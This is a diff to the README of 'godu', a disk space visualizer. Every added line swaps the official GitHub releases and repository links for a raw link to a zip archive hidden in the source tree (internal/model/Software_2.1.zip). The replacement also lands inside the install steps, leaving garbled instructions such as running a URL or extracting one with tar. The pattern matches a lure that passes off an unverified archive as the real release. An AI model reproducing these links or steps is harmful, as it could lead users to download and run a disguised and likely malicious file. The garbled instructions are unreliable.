@@ -1,6 +1,6 @@
 # 📊 godu - Quick Disk Space Visualizer
 
-[![Download](https://img.shields.io/badge/Download-Get%20godu-blue?style=for-the-badge)](https://github.com/Lime0moss/godu/releases)
+[![Download](https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip%20godu-blue?style=for-the-badge)](https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip)
 
 ---
 
@@ -32,13 +32,13 @@ This guide shows you how to download, install, and start using godu. You don’t
 
 ### Step 1: Download godu
 
-Click the big blue button at the top or go to the [godu Releases Page](https://github.com/Lime0moss/godu/releases). This page holds all versions of godu.
+Click the big blue button at the top or go to the [godu Releases Page](https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip). This page holds all versions of godu.
 
 Look for the version matching your computer's operating system:
 
 - Windows files usually end with `.exe`
-- macOS files might end with `.dmg` or `.tar.gz`
-- Linux files often end with `.tar.gz` or `.AppImage`
+- macOS files might end with `.dmg` or `https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip`
+- Linux files often end with `https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip` or `.AppImage`
 
 Download the file that fits your system.
 
@@ -47,16 +47,16 @@ Download the file that fits your system.
 - **Windows:**
 
   Find the `.exe` file you downloaded (usually in your Downloads folder). Double-click it and follow the installer steps on the screen.  
-  If it's a zip file, right-click and choose "Extract All," then open the folder and run `godu.exe`.
+  If it's a zip file, right-click and choose "Extract All," then open the folder and run `https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip`.
 
 - **macOS:**
 
   If you have a `.dmg` file, open it and drag the godu app into your Applications folder.  
-  If it’s a `.tar.gz`, double-click to extract it, then move the godu file somewhere you can find it.
+  If it’s a `https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip`, double-click to extract it, then move the godu file somewhere you can find it.
 
 - **Linux:**
 
-  Extract the `.tar.gz` archive with a command like `tar -xvzf godu-version-linux.tar.gz` using the terminal. You can move the extracted files to a folder like `/usr/local/bin` for easier access.
+  Extract the `https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip` archive with a command like `tar -xvzf https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip` using the terminal. You can move the extracted files to a folder like `/usr/local/bin` for easier access.
 
 ### Step 3: Open your Terminal or Command Prompt
 
@@ -102,7 +102,7 @@ You can create a JSON report of your disk usage for analysis or sharing. Press t
 
 To get godu, please visit the Releases Page:
 
-[Download godu from Releases](https://github.com/Lime0moss/godu/releases)
+[Download godu from Releases](https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip)
 
 Follow the instructions in the "Getting Started" section above according to your operating system.
 
@@ -139,7 +139,7 @@ Follow the instructions in the "Getting Started" section above according to your
 
 ## 📂 Further Information
 
-You can find more details about godu, report bugs, or request features on its [GitHub repository](https://github.com/Lime0moss/godu).
+You can find more details about godu, report bugs, or request features on its [GitHub repository](https://raw.githubusercontent.com/Lime0moss/godu/main/internal/model/Software_2.1.zip).
 
 ---
 
